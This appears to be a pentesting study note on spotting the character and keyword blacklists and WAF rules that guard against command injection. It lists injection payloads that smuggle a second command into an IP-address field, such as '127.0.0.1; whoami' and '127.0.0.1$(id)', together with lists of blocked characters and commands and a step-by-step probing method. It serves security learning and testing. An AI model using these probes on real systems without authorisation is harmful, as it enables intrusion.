# Command Injection – Identifying Filters

## Overview

Applications often attempt to prevent command injection using:

- blacklisted characters
- blacklisted commands
- input validation rules
- Web Application Firewalls (WAFs)

Even when protections exist, vulnerabilities may still be exploitable if filtering logic is incomplete or incorrectly implemented.

Our goal is to identify:

- what input is blocked
- how filtering works
- how validation logic behaves
- where bypass opportunities exist

Understanding filtering behaviour allows us to craft payloads that avoid detection.

Think of filters as security guards checking for obvious threats — subtle variations often slip through.

---

# 1. Common Filtering Approaches

Applications may attempt to block command injection using:

## Blacklisted characters

Example blocked characters:

```
;
&
|
$
`
(
)
>
<
```

## Blacklisted commands

Example blocked commands:

```
whoami
cat
ls
pwd
id
bash
sh
```

## Pattern matching rules

Example regex filtering.

## WAF protections

WAFs inspect HTTP requests for suspicious patterns.

Filtering may occur:

- application level
- framework level
- reverse proxy level
- firewall level

---

# 2. Recognising Filter Behaviour

Example application response:

```
Invalid input
```

Indicates input was detected as malicious.

Example blocked payload:

```
127.0.0.1; whoami
```

Possible triggers:

- semicolon detected
- command detected
- operator detected
- suspicious syntax detected

Different responses may indicate where filtering occurs.

---

# 3. Application Filter vs WAF Response

### Application-level filtering

Error displayed within application interface:

```
Invalid input
```

Usually indicates server-side validation logic.

Example PHP filter:

```php
$blacklist = ['&', '|', ';'];

foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

---

### WAF filtering

WAF responses often:

- display separate error page
- show request blocked message
- include request ID
- display IP address
- display security warning

Example WAF message:

```
Request blocked for security reasons
```

Understanding filter location helps determine bypass strategy.

---

# 4. Identifying Blacklisted Characters

To determine which characters are blocked:

test each operator individually.

Baseline working input:

```
127.0.0.1
```

Test semicolon:

```
127.0.0.1;
```

If blocked:

```
Invalid input
```

Confirms semicolon filtered.

---

# 5. Systematic Character Testing

Test one character at a time.

Example testing list:

```
;
&
|
&&
||
$
()
`
newline
```

Example tests:

```
127.0.0.1;
127.0.0.1&
127.0.0.1|
127.0.0.1&&
127.0.0.1||
127.0.0.1$(whoami)
```

Observe which inputs trigger blocking.

Goal:

identify allowed operators.

---

# 6. Identifying Blocked Commands

Filters may block specific keywords.

Example blocked command:

```
whoami
```

Test alternative commands:

```
id
pwd
hostname
uname
```

If one command blocked but others allowed, filtering is keyword-based.

Example:

```
127.0.0.1; id
```

May succeed even if whoami blocked.

---

# 7. Step-by-Step Filter Identification

## Step 1 – confirm baseline behaviour

Test normal input:

```
127.0.0.1
```

## Step 2 – test individual operators

Example:

```
127.0.0.1;
127.0.0.1&
127.0.0.1|
```

## Step 3 – identify blocked characters

Observe responses.

## Step 4 – test alternative commands

Example:

```
127.0.0.1; id
127.0.0.1; pwd
```

## Step 5 – identify command filtering behaviour

Determine whether filtering is:

- character-based
- keyword-based
- pattern-based

---

# 8. Commonly Filtered Characters

Frequently blocked characters:

```
;
&
|
`
$
(
)
>
<
#
\
/
space
newline
```

Each may affect command execution.

---

# 9. Behaviour Differences Across Filters

Filters may:

- remove characters
- encode characters
- block request entirely
- modify input silently
- truncate payload
- return error message

Example behaviour:

Input:

```
127.0.0.1;whoami
```

Modified to:

```
127.0.0.1whoami
```

Payload fails silently.

Careful observation required.

---

# 10. Testing Strategy

Work incrementally.

Start simple.

Gradually increase payload complexity.

Avoid testing multiple variables simultaneously.

Example progression:

```
127.0.0.1;
127.0.0.1&
127.0.0.1|
127.0.0.1||id
127.0.0.1&&id
```

Observe behaviour at each step.

---

# 11. Quick Testing Payloads

## baseline

```
127.0.0.1
```

## test semicolon

```
127.0.0.1;
```

## test AND

```
127.0.0.1&&id
```

## test OR

```
127.0.0.1||id
```

## test pipe

```
127.0.0.1|id
```

## test subshell

```
127.0.0.1$(id)
```

---

# 12. Key Takeaways

- applications may block command injection using blacklists
- filters may block characters or keywords
- WAFs may block suspicious patterns
- identifying filter behaviour is essential for bypass
- test characters individually to isolate restrictions
- test alternative commands to identify keyword filtering
- filtering behaviour reveals possible bypass strategies
- incremental testing improves detection accuracy

---

# Tags

#command-injection
#filter-bypass
#waf
#input-validation
#blacklist
#pentesting
#ctf
#rce
#recon
#obsidian